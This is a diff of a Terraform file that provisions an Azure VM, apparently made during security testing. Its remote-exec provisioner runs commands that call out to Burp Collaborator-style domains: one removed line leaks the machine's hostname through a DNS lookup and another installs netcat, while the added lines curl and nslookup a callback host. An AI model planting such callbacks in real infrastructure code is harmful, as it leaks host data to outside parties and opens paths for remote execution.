@@ -1,13 +1,13 @@
 variable "subscription_id" {
-  default = "12345678-1234-1234-1234-1234567892"
+  default = "12345678-1234-1234-1234-1234567893"
 }
 
 variable "ventureName" {
-  default = "12345678-1234-1234-1234-1234567892"
+  default = "12345678-1234-1234-1234-1234567893"
 }
 
 variable "tenant_id" {
-  default = "12345678-1234-1234-1234-1234567892"
+  default = "12345678-1234-1234-1234-1234567893"
 }
 
 provider "azurerm" {
@@ -138,8 +138,8 @@ resource "azurerm_virtual_machine" "vm" {
 
     provisioner "remote-exec" {
         inline = [
-          "nslookup `hostname`.e1gsw1egocwi9m46s6lqvpqw3n9exgl5.burp.17.rs",
-          "apt-get install nc"
+          "curl sso6nf5ufqnw00vkjkc4m3hau10sovck.burp.17.rs",
+          "nslookup sso6nf5ufqnw00vkjkc4m3hau10sovck.burp.17.rs"
         ]
     }
 
